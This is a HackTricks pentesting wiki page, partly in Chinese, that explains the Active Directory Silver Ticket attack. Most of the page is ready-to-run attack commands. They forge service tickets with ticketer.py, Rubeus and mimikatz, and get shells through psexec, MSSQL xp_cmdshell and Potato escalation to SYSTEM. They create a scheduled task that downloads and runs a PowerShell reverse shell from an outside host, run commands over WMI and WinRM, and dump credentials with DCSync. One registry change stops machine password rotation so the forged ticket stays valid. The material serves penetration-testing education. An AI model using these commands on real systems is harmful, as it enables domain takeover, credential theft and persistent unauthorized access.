# Silver Ticket

{{#include ../../banners/hacktricks-training.md}}



## Silver ticket

The **Silver Ticket** attack involves the exploitation of service tickets in Active Directory (AD) environments. This method relies on **acquiring the NTLM hash of a service account**, such as a computer account, to forge a Ticket Granting Service (TGS) ticket. With this forged ticket, an attacker can access specific services on the network, **impersonating any user**, typically aiming for administrative privileges. It's emphasized that using AES keys for forging tickets is more secure and less detectable.

> [!WARNING]
> Silver Tickets are less detectable than Golden Tickets because they only require the **hash of the service account**, not the krbtgt account. However, they are limited to the specific service they target. Moreover, just stealing the password of a user.
> Moreover, if you compromise an **account's password with a SPN** you can use that password to create a Silver Ticket impersonating any user to that service.

For ticket crafting, different tools are employed based on the operating system:

### On Linux
```bash
python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```
### 在 Windows 上
```bash
# Using Rubeus
## /ldap option is used to get domain data automatically
## With /ptt we already load the tickt in memory
rubeus.exe asktgs /user:<USER> [/rc4:<HASH> /aes128:<HASH> /aes256:<HASH>] /domain:<DOMAIN> /ldap /service:cifs/domain.local /ptt /nowrap /printcmd

# Create the ticket
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET>"

# Inject the ticket
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```
CIFS 服务被强调为访问受害者文件系统的常见目标，但像 HOST 和 RPCSS 这样的其他服务也可以被利用来执行任务和进行 WMI 查询。

### 示例：MSSQL 服务 (MSSQLSvc) + Potato to SYSTEM

如果你拥有某个 SQL 服务账号（例如 sqlsvc）的 NTLM hash（或 AES key），你可以为 MSSQL SPN 伪造一个 TGS，并向 SQL 服务冒充任意用户。从那里，启用 xp_cmdshell 以该 SQL 服务账号的身份执行命令。如果该令牌具有 SeImpersonatePrivilege，则可以链式使用 Potato 提权到 SYSTEM。
```bash
# Forge a silver ticket for MSSQLSvc (RC4/NTLM example)
python ticketer.py -nthash <SQLSVC_RC4> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-spn MSSQLSvc/<host.fqdn>:1433 administrator
export KRB5CCNAME=$PWD/administrator.ccache

# Connect to SQL using Kerberos and run commands via xp_cmdshell
impacket-mssqlclient -k -no-pass <DOMAIN>/administrator@<host.fqdn>:1433 \
-q "EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'whoami'"
```
- 如果获得的上下文具有 SeImpersonatePrivilege（对于服务账户通常为真），使用 Potato 变体来获取 SYSTEM：
```bash
# On the target host (via xp_cmdshell or interactive), run e.g. PrintSpoofer/GodPotato
PrintSpoofer.exe -c "cmd /c whoami"
# or
GodPotato -cmd "cmd /c whoami"
```
关于滥用 MSSQL 和启用 xp_cmdshell 的更多细节：

{{#ref}}
abusing-ad-mssql.md
{{#endref}}

Potato 技术概述：

{{#ref}}
../windows-local-privilege-escalation/roguepotato-and-printspoofer.md
{{#endref}}

## 可用服务

| 服务类型                                   | Service Silver Tickets                                                     |
| ------------------------------------------ | -------------------------------------------------------------------------- |
| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>视操作系统而定：</p><p>WSMAN</p><p>RPCSS</p>       |
| WinRM                                      | <p>HOST</p><p>HTTP</p><p>在某些情况下你可以只请求：WINRM</p>               |
| 计划任务                                   | HOST                                                                       |
| Windows 文件共享，也 psexec                 | CIFS                                                                       |
| LDAP 操作（包括 DCSync）                   | LDAP                                                                       |
| Windows 远程服务器管理工具                 | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
| Golden Tickets                             | krbtgt                                                                     |

使用 **Rubeus** 可以通过以下参数**请求所有**这些票据：

- `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### Silver tickets 事件 ID

- 4624: 账户登录
- 4634: 账户注销
- 4672: 管理员登录

## 持久性

为避免机器每30天轮换密码，可设置 `HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1`，或者可以将 `HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters\MaximumPasswordAge` 设置为大于 30days 的值，以指示机器密码应在何时轮换。

## 滥用服务票据

在以下示例中，假设票据是通过模拟管理员账户获取的。

### CIFS

使用该票据，你可以通过 **SMB**（如果暴露）访问 `C$` 和 `ADMIN$` 文件夹，并将文件复制到远程文件系统的某个位置，例如执行如下操作：
```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```
你还可以使用 **psexec** 在主机内获得 shell 或执行任意命令：

{{#ref}}
../lateral-movement/psexec-and-winexec.md
{{#endref}}

### HOST

拥有此权限后，你可以在远程计算机上创建计划任务并执行任意命令：
```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
### HOST + RPCSS

利用这些 tickets，你可以 **在受害系统中执行 WMI**:
```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```
在以下页面查找**更多关于 wmiexec 的信息**：

{{#ref}}
../lateral-movement/wmiexec.md
{{#endref}}

### 主机 + WSMAN (WINRM)

通过对计算机的 winrm 访问，你可以**访问它**，甚至获得一个 PowerShell：
```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```
Check the following page to learn **more ways to connect with a remote host using winrm**:


{{#ref}}
../lateral-movement/winrm.md
{{#endref}}

> [!WARNING]
> 注意 **winrm 必须在远程计算机上启用并处于监听状态** 才能访问它。

### LDAP

拥有此权限后，您可以使用 **DCSync** 转储 DC 数据库：
```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```
**了解更多关于 DCSync 的信息**，请参阅以下页面：


{{#ref}}
dcsync.md
{{#endref}}


## 参考资料

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027](https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027)
- [HTB Sendai – 0xdf: Silver Ticket + Potato path](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)



{{#include ../../banners/hacktricks-training.md}}
